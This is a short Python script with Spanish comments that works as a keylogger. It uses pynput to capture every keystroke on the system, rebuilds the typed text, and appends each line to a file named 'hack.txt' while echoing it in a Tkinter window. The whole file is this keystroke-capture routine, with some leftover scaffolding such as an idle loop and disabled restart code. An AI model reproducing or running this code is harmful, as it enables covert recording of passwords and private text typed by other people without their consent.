from pynput import keyboard as kb
from tkinter import *

class gurdar():

	def __init__(self,cont):

		self.texto=[]
		self.cont=0
		self.txt = []
		self.aux = 1

		#se inicia el listener para obtener las teclas
		self.escuchador = kb.Listener(self.pulsa)
		self.escuchador.start()

		#se inicia la ventana GUI
		self.ventana = Tk()
		self.ventana.geometry("600x500")

		self.label_Text = Label(self.ventana, text = self.txt)
		self.label_Text.place(x = 50, y = 50)

		self.text = Text(self.ventana)
		self.text.place(x=370 , y=20,width = 200, height = 450)
		Button(self.ventana,text = "Aceptar", command = self.Get).place(x = 20, y = 20)

		self.ventana.mainloop()
		aux = 0
		while aux < 100000:
			aux += 1
		#if(self.cont==200):
			#cont=self.cont

		cont=201
		#reiniciar(cont)

	def Get(self):

		print(self.text.get("1.0","1.1"))

	def Config(self):

		self.label_Text.configure(text = self.txt[(len(self.txt))-1])

		self.text.insert(str(self.aux)+".0", str(self.txt))
		self.aux += 1
		#self.ventana.after(1000,self.Config)

	def pulsa(self,tecla):
		print('Se ha pulsado la tecla ' + str(tecla))
	
		#print('Se ha soltado la tecla ' + str(tecla))
	
		aux=str(tecla)
		
		if aux == 'Key.enter':
		
			tex= "".join(self.texto)
			tex2=[]
			for i in tex:
				if(i!="'"):
					#print(i)
					tex2.append(i)


			tex2="".join(tex2)
			self.archivo_persona=open("hack.txt","a")
			self.archivo_persona.write(tex2)
			self.archivo_persona.write("\n")
			self.archivo_persona.close()
			self.txt=(tex2+"\n")
			print(tex)
			self.texto = []
			self.Config()
			#return False

		elif(aux == 'Key.space'):

			self.texto.append(" ")

		elif(aux == 'Key.backspace'):
			
			try:
				self.texto.pop()
			except:
				print("la variable texto esta vacia")

		#elif(aux == 'Key.enter' or aux == 'Key.tab'):
		elif(aux == 'Key.tab'):

			self.texto.append("/")

		elif(aux == '<67>'):

			self.cont=200
			self.ventana.destroy()
			return False

		elif(aux == '<88>'):

			print("la ventana se cerrara")

		else:

			self.texto.append(str(tecla))


def reiniciar(cont):
	

	if(cont<200):

		regist=gurdar(cont)


reiniciar(0)



	